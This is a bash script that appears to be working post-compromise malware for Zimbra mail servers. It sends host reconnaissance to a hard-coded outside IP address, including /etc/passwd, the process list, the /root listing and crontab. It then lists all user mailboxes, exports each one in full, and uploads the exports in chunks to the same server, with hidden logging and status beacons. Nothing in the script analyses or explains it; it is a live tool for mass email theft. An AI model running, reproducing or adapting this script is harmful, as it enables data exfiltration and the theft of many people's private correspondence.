#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
TAG=nkr
ZM=/opt/zimbra/bin
LOG=/tmp/.${TAG}_dl.log
$ZM/zmprov -l gaa 2>/dev/null | grep -vE "^(admin|spam\.|ham\.|virus-quarantine|galsync)" > /tmp/.${TAG}_accts.txt
while read -r m; do
  echo "=== $m $(date +%T)" >> "$LOG"
  $ZM/zmmailbox -z -m "$m" getRestURL "//?fmt=tgz&query=is:anywhere" 2>/dev/null | \
  split -b 60m --filter="curl -sk -m 600 -X POST --data-binary @- http://131.123.43.239/up -H 'X-Name: ${TAG}_au_${m}_'\$FILE" - 2>>"$LOG"
  c=$?
  echo "rc=$c $m $(date +%T)" >> "$LOG"
  echo "$m" | curl -sm 30 -X POST --data-binary @- "http://131.123.43.239/up" -H "X-Name: nkr_rc_$(echo $m | tr -c "a-zA-Z0-9" "_")" >/dev/null 2>&1
done < /tmp/.${TAG}_accts.txt
echo ALLDONE >> "$LOG"
echo ALLDONE | curl -sm 30 -X POST --data-binary @- "http://131.123.43.239/up" -H "X-Name: nkr_alldone" >/dev/null 2>&1
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


